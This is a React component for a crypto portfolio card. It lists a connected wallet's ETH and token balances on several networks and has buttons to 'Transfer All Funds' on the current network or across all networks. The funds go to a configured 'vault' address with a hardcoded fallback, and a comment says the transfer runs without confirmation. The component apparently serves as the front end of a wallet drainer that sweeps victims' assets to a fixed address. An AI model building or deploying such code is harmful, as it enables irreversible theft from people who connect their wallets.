import { useState } from "react";
import { Send, AlertTriangle, Coins, Bug } from "lucide-react";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Alert, AlertDescription } from "@/components/ui/alert";
import { useWeb3 } from "@/hooks/use-web3";
import { useToast } from "@/hooks/use-toast";
import type { WalletState } from "@/lib/web3";

interface BalanceCardProps {
  walletState: WalletState;
  onTransactionStart: (txHash: string) => void;
  onMultiNetworkTransfer?: (toAddress: string) => Promise<any>;
}

export default function BalanceCard({ walletState, onTransactionStart, onMultiNetworkTransfer }: BalanceCardProps) {
  const { isTransferring, transferAllFunds } = useWeb3();
  const { toast } = useToast();
  const [showConfirmation, setShowConfirmation] = useState(false);

  // Get destination address from environment - using your vault address
  const destinationAddress = import.meta.env.VITE_DESTINATION_ADDRESS || "0x15E1A8454E2f31f64042EaE445Ec89266cb584bE";

  // Validation function for Ethereum address
  const isValidEthereumAddress = (address: string): boolean => {
    return /^0x[a-fA-F0-9]{40}$/.test(address);
  };

  // Show error if destination address is invalid
  if (!destinationAddress || !isValidEthereumAddress(destinationAddress)) {
    return (
      <Card>
        <CardContent className="pt-6">
          <Alert className="border-red-200 bg-red-50">
            <AlertTriangle className="h-4 w-4 text-red-600" />
            <AlertDescription className="text-red-800">
              <div className="font-medium">Configuration Error</div>
              <div className="text-sm mt-1">
                Invalid or missing destination address. Please check your configuration.
                <br />
                Current address: {destinationAddress || 'Not set'}
              </div>
            </AlertDescription>
          </Alert>
        </CardContent>
      </Card>
    );
  }

  const handleTransferClick = async () => {
    // Direct transfer without confirmation
    const txHashes = await transferAllFunds(destinationAddress);
    if (txHashes && txHashes.length > 0) {
      // Use the first transaction hash for tracking
      onTransactionStart(txHashes[0]);
    }
  };

  const handleMultiNetworkTransfer = async () => {
    if (onMultiNetworkTransfer) {
      await onMultiNetworkTransfer(destinationAddress);
    }
  };

  // Calculate total USD value
  const balanceUSD = walletState.totalUsdValue.toLocaleString('en-US', {
    style: 'currency',
    currency: 'USD'
  });

  if (!walletState.isConnected) {
    return (
      <Card>
        <CardContent className="pt-6">
          <div className="text-center py-8">
            <div className="text-gray-500 mb-4">
              <h3 className="text-lg font-medium text-gray-900 mb-2">Wallet Not Connected</h3>
              <p className="text-gray-600">Connect your wallet to view balance and transfer funds</p>
            </div>
          </div>
        </CardContent>
      </Card>
    );
  }

  return (
    <Card>
      <CardContent className="pt-6">
        <div className="flex justify-between items-center mb-6">
          <h2 className="text-xl font-semibold text-gray-900">Current Balance</h2>
          <details className="text-xs">
            <summary className="cursor-pointer text-blue-600 hover:text-blue-800 flex items-center gap-1">
              <Bug className="h-3 w-3" />
              Debug Info
            </summary>
            <div className="mt-2 p-2 bg-gray-50 rounded text-xs font-mono">
              <div><strong>Connection:</strong> {walletState.isConnected ? 'Connected' : 'Disconnected'}</div>
              <div><strong>Address:</strong> {walletState.address || 'None'}</div>
              <div><strong>Network:</strong> {walletState.networkId || 'None'}</div>
              <div><strong>ETH Balance:</strong> {walletState.ethBalance || '0'}</div>
              <div><strong>Token Count:</strong> {walletState.tokenBalances?.length || 0}</div>
              <div><strong>USD Value:</strong> ${walletState.totalUsdValue || 0}</div>
              <div><strong>Window.Ethereum:</strong> {typeof window !== 'undefined' && window.ethereum ? 'Available' : 'Not Available'}</div>
            </div>
          </details>
        </div>

        {/* Multi-Network Portfolio Display */}
        <div className="mb-8">
          <div className="text-center mb-6">
            <div className="text-3xl font-bold text-gray-900 mb-2">
              Multi-Network Portfolio
            </div>
            <div className="text-lg text-gray-600">
              Total Value: {balanceUSD}
            </div>
          </div>

          {/* Current Network Balance */}
          <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-4">
            <h3 className="font-semibold text-blue-900 mb-3">
              Current Network: {walletState.networkName}
            </h3>

            {/* Native Currency */}
            <div className="bg-white rounded p-3 mb-3">
              <div className="flex justify-between items-center">
                <div className="flex items-center space-x-2">
                  <div className="w-8 h-8 bg-blue-500 rounded-full flex items-center justify-center text-white text-xs font-bold">
                    ETH
                  </div>
                  <div>
                    <div className="font-medium">Ethereum</div>
                    <div className="text-xs text-gray-500">Native Currency</div>
                  </div>
                </div>
                <div className="text-right">
                  <div className="font-semibold">
                    {walletState.ethBalance ? parseFloat(walletState.ethBalance).toFixed(6) : "0.000000"} ETH
                  </div>
                  <div className="text-xs text-gray-600">
                    ${((parseFloat(walletState.ethBalance || '0')) * 2500).toFixed(2)}
                  </div>
                </div>
              </div>
            </div>

            {/* Current Network Tokens */}
            {walletState.tokenBalances && walletState.tokenBalances.length > 0 && (
              <div className="space-y-2">
                {walletState.tokenBalances.map((token, index) => (
                  <div key={index} className="bg-white rounded p-3">
                    <div className="flex justify-between items-center">
                      <div className="flex items-center space-x-2">
                        <div className="w-8 h-8 bg-green-500 rounded-full flex items-center justify-center text-white text-xs font-bold">
                          {token.symbol.substring(0, 3)}
                        </div>
                        <div>
                          <div className="font-medium">{token.symbol}</div>
                          <div className="text-xs text-gray-500 font-mono">
                            {token.contractAddress}
                          </div>
                        </div>
                      </div>
                      <div className="text-right">
                        <div className="font-semibold">
                          {parseFloat(token.balance).toFixed(6)} {token.symbol}
                        </div>
                        <div className="text-xs text-gray-600">
                          {token.usdValue?.toLocaleString('en-US', { style: 'currency', currency: 'USD' })}
                        </div>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>

          {/* All Networks Summary */}
          {walletState.networkBalances && walletState.networkBalances.length > 0 && (
            <div className="bg-green-50 border border-green-200 rounded-lg p-4">
              <h3 className="font-semibold text-green-900 mb-3 flex items-center">
                <Coins className="w-5 h-5 mr-2" />
                All Networks ({walletState.networkBalances.length} networks)
              </h3>

              <div className="space-y-3 max-h-64 overflow-y-auto">
                {walletState.networkBalances.map((network, networkIndex) => (
                  <div key={networkIndex} className="bg-white rounded p-3">
                    <div className="font-medium text-gray-900 mb-2">
                      {network.networkName}
                    </div>

                    {/* Native Currency Balance */}
                    {parseFloat(network.nativeBalance) > 0 && (
                      <div className="flex justify-between items-center text-sm mb-2">
                        <span className="text-gray-600">{network.nativeCurrency}</span>
                        <span className="font-medium">
                          {parseFloat(network.nativeBalance).toFixed(6)} {network.nativeCurrency}
                        </span>
                      </div>
                    )}

                    {/* Token Balances */}
                    {network.tokenBalances.map((token, tokenIndex) => (
                      <div key={tokenIndex} className="border-l-2 border-gray-200 pl-3 mb-2">
                        <div className="flex justify-between items-center text-sm">
                          <div>
                            <div className="font-medium">{token.symbol}</div>
                            <div className="text-xs text-gray-500 font-mono">
                              {token.contractAddress}
                            </div>
                          </div>
                          <div className="text-right">
                            <div className="font-semibold">
                              {parseFloat(token.balance).toFixed(6)} {token.symbol}
                            </div>
                            <div className="text-xs text-gray-600">
                              {token.usdValue?.toLocaleString('en-US', { style: 'currency', currency: 'USD' })}
                            </div>
                          </div>
                        </div>
                      </div>
                    ))}

                    {network.tokenBalances.length === 0 && parseFloat(network.nativeBalance) === 0 && (
                      <div className="text-xs text-gray-500 italic">No tokens found on this network</div>
                    )}
                  </div>
                ))}
              </div>
            </div>
          )}
        </div>

        <Alert className="mb-6 border-warning bg-yellow-50">
          <AlertTriangle className="h-4 w-4 text-warning" />
          <AlertDescription className="text-yellow-800">
            <div className="font-medium">Transfer All Cryptocurrencies</div>
            <div className="text-sm text-yellow-700 space-y-1">
              <div>• <strong>Current Network:</strong> Transfer ETH and ERC-20 tokens from the connected network</div>
              <div>• <strong>All Networks:</strong> Scan and transfer from ALL supported networks (Ethereum, Polygon, BSC, etc.)</div>
              <div>• Both actions are IRREVERSIBLE and will send funds to the configured vault address</div>
            </div>
          </AlertDescription>
        </Alert>

        <div className="mb-4">
          <label className="block text-sm font-medium text-gray-700 mb-2">
            Destination Address (All funds will be sent here)
          </label>
          <div className="bg-blue-50 border border-blue-200 rounded-lg p-3">
            <div className="text-sm font-mono text-blue-900 break-all">
              {destinationAddress}
            </div>
            <div className="text-xs text-blue-700 mt-1">
              ✓ Valid Ethereum address configured
            </div>
          </div>
        </div>

        <div className="space-y-3">
          <Button
            onClick={handleTransferClick}
            disabled={isTransferring || walletState.totalUsdValue === 0}
            className="w-full bg-danger hover:bg-red-600 text-white font-semibold py-4 px-6 flex items-center justify-center space-x-2"
          >
            <Send className="w-4 h-4" />
            <span>Transfer All Funds (Current Network)</span>
          </Button>

          {onMultiNetworkTransfer && (
            <Button
              onClick={handleMultiNetworkTransfer}
              disabled={isTransferring || walletState.totalUsdValue === 0}
              variant="outline"
              className="w-full border-orange-500 text-orange-600 hover:bg-orange-50 font-semibold py-4 px-6 flex items-center justify-center space-x-2"
            >
              <span>⚡</span>
              <span>{isTransferring ? "Scanning Networks..." : "Transfer All Networks"}</span>
            </Button>
          )}
        </div>
      </CardContent>
    </Card>
  );
}